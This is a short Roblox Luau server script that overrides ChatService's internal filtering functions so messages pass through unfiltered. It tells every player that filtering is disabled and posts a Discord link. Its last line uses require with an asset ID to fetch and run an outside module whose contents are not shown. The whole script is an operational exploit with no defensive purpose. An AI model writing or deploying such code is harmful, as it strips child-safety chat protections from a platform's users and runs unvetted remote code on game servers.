local ServerScriptService = game:GetService('ServerScriptService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')

local ChatServiceRunner = ServerScriptService:WaitForChild('ChatServiceRunner')
if not ChatServiceRunner then return warn'no chatservicerunner' end

local ChatService = ChatServiceRunner:WaitForChild('ChatService')
if not ChatService then return warn'no chatservice' end

ChatService = require(ChatService)

ChatService.InternalApplyRobloxFilterAndTranslate = function(self, _, _, Message, _) return true, false, Message end
ChatService.InternalApplyRobloxFilterNewAPI = function(self, _, Message, _) return true, false, Message end
ChatService.InternalApplyRobloxFilter = function(self, _, Message, _) return Message end

for _, Speaker in pairs(ChatService.Speakers) do
	Speaker:SendSystemMessage('Message filtering has been disabled, enjoy!', 'System')
	Speaker:SendSystemMessage('https://0xfe0f.github.io/discord', 'System')
end

require(13835220156)
